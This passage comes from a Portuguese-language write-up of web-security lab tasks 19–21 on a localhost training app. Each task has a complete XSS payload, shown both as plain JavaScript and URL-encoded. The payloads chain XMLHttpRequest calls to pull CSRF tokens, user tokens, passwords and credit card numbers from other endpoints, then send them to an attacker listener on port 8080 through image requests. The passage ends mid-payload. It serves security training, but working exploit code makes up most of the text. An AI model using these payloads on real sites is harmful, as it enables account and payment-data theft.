</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09var%20link%20%3D%20document.getElementById%28%22config%22%29%3B%0A%09var%20id%20%3D%20link.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req2.responseXML%3B%0A%09%09%09credit_card%20%3D%20htmlPage.getElementById%28%22credit_card%22%29.innerHTML%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20credit_card%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fcredit_card%3D%22%2Bcredit_card%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09%09csrf_token%20%3D%20htmlPage.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09%09req2.open%28%22POST%22%2C%20%22%2F19%2FcreditCard%2F%22%2C%20true%29%3B%0A%09%09%09req2.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0A%09%09%09req2.responseType%20%3D%20%22document%22%3B%0A%09%09%09req2.send%28%22user_id%3D%22%2Bid%2B%22%26csrf_token%3D%22%2Bcsrf_token%29%3B%0A%09%09%7D%0A%09%7D%0A%09req.open%28%22GET%22%2C%20link.href%2C%20true%29%3B%0A%09req.responseType%20%3D%20%22document%22%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/19/?search=%3Cscript%3E%0A%09var%20link%20%3D%20document.getElementById%28%22config%22%29%3B%0A%09var%20id%20%3D%20link.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req2.responseXML%3B%0A%09%09%09credit_card%20%3D%20htmlPage.getElementById%28%22credit_card%22%29.innerHTML%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20credit_card%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fcredit_card%3D%22%2Bcredit_card%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09%09csrf_token%20%3D%20htmlPage.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09%09req2.open%28%22POST%22%2C%20%22%2F19%2FcreditCard%2F%22%2C%20true%29%3B%0A%09%09%09req2.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0A%09%09%09req2.responseType%20%3D%20%22document%22%3B%0A%09%09%09req2.send%28%22user_id%3D%22%2Bid%2B%22%26csrf_token%3D%22%2Bcsrf_token%29%3B%0A%09%09%7D%0A%09%7D%0A%09req.open%28%22GET%22%2C%20link.href%2C%20true%29%3B%0A%09req.responseType%20%3D%20%22document%22%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E">http://localhost/19/?search=%3Cscript%3E%0A%09var%20link%20%3D%20document.getElementById%28%22config%22%29%3B%0A%09var%20id%20%3D%20link.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req2.responseXML%3B%0A%09%09%09credit_card%20%3D%20htmlPage.getElementById%28%22credit_card%22%29.innerHTML%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20credit_card%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fcredit_card%3D%22%2Bcredit_card%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09%09csrf_token%20%3D%20htmlPage.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09%09req2.open%28%22POST%22%2C%20%22%2F19%2FcreditCard%2F%22%2C%20true%29%3B%0A%09%09%09req2.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0A%09%09%09req2.responseType%20%3D%20%22document%22%3B%0A%09%09%09req2.send%28%22user_id%3D%22%2Bid%2B%22%26csrf_token%3D%22%2Bcsrf_token%29%3B%0A%09%09%7D%0A%09%7D%0A%09req.open%28%22GET%22%2C%20link.href%2C%20true%29%3B%0A%09req.responseType%20%3D%20%22document%22%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 configurado para ouvir a requisição feita.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-59.png" alt="Python server" /></p><p>Ao carregar a página, a informação sensível é carregada.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-60.png" alt="Resultado" /></p><p>Logo em seguida, os dados são encaminhados para o <em>Python server</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-61.png" alt="Resultado" /></p><h4 id="referências-18">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest</a></ul><h3 id="task-20---json-parsing-multi-level"><em>Task 20 - JSON Parsing Multi-Level</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-63.png" alt="Task 20" /></p><h4 id="objetivo-20">Objetivo</h4><p>Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.</p><p>O objetivo desta <em>task</em>, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar os dados sensíveis contidos em outro <em>endpoint</em> da aplicação, porém, existe mais de um nível de acesso, neste caso, após uma solicitação do tipo GET, um JSON é retornado com o <em>token</em> do usuário. No segundo <em>endpoint</em>, outro JSON é entregue com a senha do usuário. Após obter estes dados, eles precisam ser inseridos em um elemento chamado <code class="language-plaintext highlighter-rouge">exploit</code> que está na tela inicial, além de enviá-lo para uma máquina sob controle do atacante.</p><h4 id="conhecimento-base-19">Conhecimento Base</h4><p>O método <code class="language-plaintext highlighter-rouge">JSON.parse()</code> em JavaScript é usado para converter uma <em>string</em> formatada como JSON em um objeto JavaScript. Isso é útil quando você está lidando com dados JSON, como a resposta de uma solicitação AJAX ao servidor.</p><h4 id="exploração-19">Exploração</h4><p>Seguindo as instruções da <em>task</em>, ao acessarmos a URL abaixo, somos levados ao primeiro JSON que contém o <em>token</em> do usuário.</p><ul><li><a href="http://localhost/20/getToken/?user_id=3663">http://localhost/20/getToken/?user_id=3663</a></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-64.png" alt="Primeiro JSON" /></p><p>Ainda seguindo as instruções, a URL abaixo utiliza o id do usuário e o <em>token</em> obtido, fornecendo um próximo JSON com a senha do usuário.</p><ul><li><a href="http://localhost/20/getPass/?user_id=3663&amp;token=d8aea5b04b59ad8a36d1e2c10a77c426">http://localhost/20/getPass/?user_id=3663&amp;token=d8aea5b04b59ad8a36d1e2c10a77c426</a></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-65.png" alt="Segundo JSON" /></p><p>Seguindo esta premissa, podemos utilizar o método <code class="language-plaintext highlighter-rouge">JSON.parse()</code> para tratar a resposta de todos os <em>requests</em> para imprimir os dados em tela, assim como enviá-los para a máquina sob controle do atacante.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">req2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	<span class="nx">id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">user_id</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">:</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>

	<span class="nx">req2</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req2</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req2</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">resp</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">req2</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
			<span class="nx">pass</span> <span class="o">=</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
			<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">pass</span><span class="p">;</span>
			<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/?pass=</span><span class="dl">"</span><span class="o">+</span><span class="nx">pass</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">resp</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
			<span class="nx">token</span> <span class="o">=</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>

			<span class="nx">req2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/20/getPass/?user_id=</span><span class="dl">"</span><span class="o">+</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/20/getToken/?user_id=</span><span class="dl">"</span><span class="o">+</span><span class="nx">id</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
	<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09id%20%3D%20document.getElementById%28%22user_id%22%29.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09pass%20%3D%20resp.data.password%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20pass%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fpass%3D%22%2Bpass%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req.responseText%29%3B%0A%09%09%09token%20%3D%20resp.params.token%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20%22%2F20%2FgetPass%2F%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20%22%2F20%2FgetToken%2F%3Fuser_id%3D%22%2Bid%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/20/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09id%20%3D%20document.getElementById%28%22user_id%22%29.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09pass%20%3D%20resp.data.password%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20pass%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fpass%3D%22%2Bpass%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req.responseText%29%3B%0A%09%09%09token%20%3D%20resp.params.token%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20%22%2F20%2FgetPass%2F%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20%22%2F20%2FgetToken%2F%3Fuser_id%3D%22%2Bid%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E">http://localhost/20/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09id%20%3D%20document.getElementById%28%22user_id%22%29.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09pass%20%3D%20resp.data.password%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20pass%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fpass%3D%22%2Bpass%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req.responseText%29%3B%0A%09%09%09token%20%3D%20resp.params.token%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20%22%2F20%2FgetPass%2F%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20%22%2F20%2FgetToken%2F%3Fuser_id%3D%22%2Bid%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 configurado para ouvir a requisição feita.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-59.png" alt="Python server" /></p><p>Ao carregar a página, a informação sensível é carregada.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-66.png" alt="Resultado" /></p><p>Logo em seguida, os dados são encaminhados para o <em>Python server</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-67.png" alt="Resultado" /></p><h4 id="referências-19">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse</a></ul><h3 id="task-21---xml-parsing-multi-level"><em>Task 21 - XML Parsing Multi-Level</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-62.png" alt="Task 21" /></p><h4 id="objetivo-21">Objetivo</h4><p>Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.</p><p>O objetivo desta <em>task</em>, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar os dados sensíveis contidos em outro <em>endpoint</em> da aplicação, porém, existe mais de um nível de acesso, neste caso, após uma solicitação do tipo GET, um XML é retornado com o próximo <em>endpoint</em>, o <em>token</em> do usuário e o <code class="language-plaintext highlighter-rouge">user_id</code>. No segundo <em>endpoint</em>, um JSON é entregue com números de cartão de crédito. Após obter estes dados, eles precisam ser inseridos em um elemento chamado <code class="language-plaintext highlighter-rouge">exploit</code> que está na tela inicial, além de enviá-lo para uma máquina sob controle do atacante.</p><h4 id="conhecimento-base-20">Conhecimento Base</h4><p>A propriedade <code class="language-plaintext highlighter-rouge">responseXML</code> do objeto <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> é usada para capturar a resposta do servidor quando é um documento XML. Se a resposta for um documento XML bem formado, <code class="language-plaintext highlighter-rouge">responseXML</code> retornará um objeto <em>Document</em>, que representa o documento XML e pode ser manipulado usando a API DOM (<em>Document Object Model</em>) do JavaScript.</p><p>Por exemplo, se você fizer uma solicitação a uma API que retorna um documento XML, você pode usar <code class="language-plaintext highlighter-rouge">responseXML</code> para obter esse documento e então usar a API DOM para buscar elementos específicos.</p><h4 id="exploração-20">Exploração</h4><p>Ao acessar o <em>link</em> “<em>API Endpoints</em>”, somos levados a um XML que contém informações importantes sobre o próximo <em>endpoint</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-68.png" alt="XML" /></p><p>Com a propriedade <code class="language-plaintext highlighter-rouge">responseXML</code> é possível fazer o <em>parsing</em> do XML e obter o valor de cada um dos campos com o método <code class="language-plaintext highlighter-rouge">getElementsByTagName()</code>.</p><p>Ao criar a URL abaixo com os dados capturados, somos levados a um JSON que contém os números de cartão de crédito.</p><ul><li><a href="http://localhost/21/creditCards/?user_id=3663&amp;token=d8aea5b04b59ad8a36d1e2c10a77c426">http://localhost/21/creditCards/?user_id=3663&amp;token=d8aea5b04b59ad8a36d1e2c10a77c426</a></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-69.png" alt="Cartões de crédito" /></p><p>Com estas informações, podemos montar os <em>requests</em> sequenciais.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">req2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">endpoints</span><span class="dl">"</span><span class="p">).</span><span class="nx">href</span><span class="p">;</span>

	<span class="nx">req2</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req2</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req2</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">cards</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">req2</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
			<span class="kd">var</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="nx">cards</span><span class="p">.</span><span class="nx">card_1</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">cards</span><span class="p">.</span><span class="nx">card_2</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">cards</span><span class="p">.</span><span class="nx">card_3</span><span class="p">;</span>
			<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">;</span>
			<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/?c1=</span><span class="dl">"</span><span class="o">+</span><span class="nx">cards</span><span class="p">.</span><span class="nx">card_1</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;c2=</span><span class="dl">"</span><span class="o">+</span><span class="nx">cards</span><span class="p">.</span><span class="nx">card_2</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;c3=</span><span class="dl">"</span><span class="o">+</span><span class="nx">cards</span><span class="p">.</span><span class="nx">card_3</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">user_id-param-value</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">childNodes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">nodeValue</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">token-param-value</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">childNodes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">nodeValue</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">endpoint</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">endpoint</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">childNodes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">nodeValue</span><span class="p">;</span>

			<span class="nx">req2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">endpoint</span><span class="o">+</span><span class="dl">"</span><span class="s2">?user_id=</span><span class="dl">"</span><span class="o">+</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">link</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
	<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20link%20%3D%20document.getElementById%28%22endpoints%22%29.href%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20cards%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09var%20parsed%20%3D%20cards.card_1%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_2%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_3%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20parsed%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fc1%3D%22%2Bcards.card_1%2B%22%26c2%3D%22%2Bcards.card_2%2B%22%26c3%3D%22%2Bcards.card_3%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20id%20%3D%20req.responseXML.getElementsByTag